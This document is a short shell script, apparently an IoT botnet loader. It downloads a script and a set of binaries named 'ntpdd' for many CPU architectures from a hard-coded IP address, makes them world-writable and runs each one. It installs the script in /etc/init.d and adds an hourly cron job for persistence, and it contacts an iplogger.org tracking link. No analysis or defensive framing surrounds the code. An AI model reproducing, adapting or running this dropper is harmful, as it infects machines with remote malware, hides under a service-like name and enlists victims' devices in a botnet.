#!/bin/sh

bins="ntpdd.arm4 ntpdd.arm4tl ntpdd.arm5 ntpdd.arm6 ntpdd.arm7 ntpdd.m68k ntpdd.mips ntpdd.mpsl ntpdd.mips64 ntpdd.ppc ntpdd.sh4 ntpdd.x86 ntpdd.x86_64 ntpdd.spc"

mkdir /opt/
wget -q http://45.95.168.103/sh.sh -O /opt/sh.sh || curl -s http://45.95.168.103/sh.sh -o /opt/sh.sh && chmod 777 /opt/sh.sh
cp /opt/sh.sh /etc/init.d/sh.sh && chmod 777 /etc/init.d/sh.sh

for bin in $bins; do
	wget -q http://45.95.168.103/all/$bin -O /opt/$bin || curl -s http://45.95.168.103/all/$bin -o /opt/$bin
	chmod 777 /opt/$bin
	/opt/$bin linux
done

wget -q https://iplogger.org/1ODeA >/dev/null

crontab -l | grep -e "sh.sh" | grep -v grep
if [ $? -eq 0 ]; then
  (
    crontab -l 2>/dev/null
    echo "5 * * * * sh /opt/sh.sh > /dev/null 2>&1"
  ) | crontab -
fi